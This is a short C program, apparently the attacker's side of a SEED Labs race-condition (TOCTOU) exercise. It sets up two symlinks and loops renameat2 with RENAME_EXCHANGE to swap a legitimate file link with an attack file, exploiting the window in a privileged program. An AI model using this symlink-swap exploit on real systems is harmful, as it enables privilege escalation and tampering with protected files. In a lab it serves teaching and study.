#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>

int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/home/seed/lab2/task5/input.txt"); unlink("/tmp/ABC"); 
    symlink("/home/seed/lab2/task5/legal.txt", "/home/seed/lab2/task5/input.txt");
    symlink("/home/seed/lab2/task5/attack.txt", "/tmp/ABC");
	while(1) {
    	renameat2(0, "/home/seed/lab2/task5/input.txt", 0, "/tmp/ABC", flags);
        usleep(200);
	}
    return 0;
}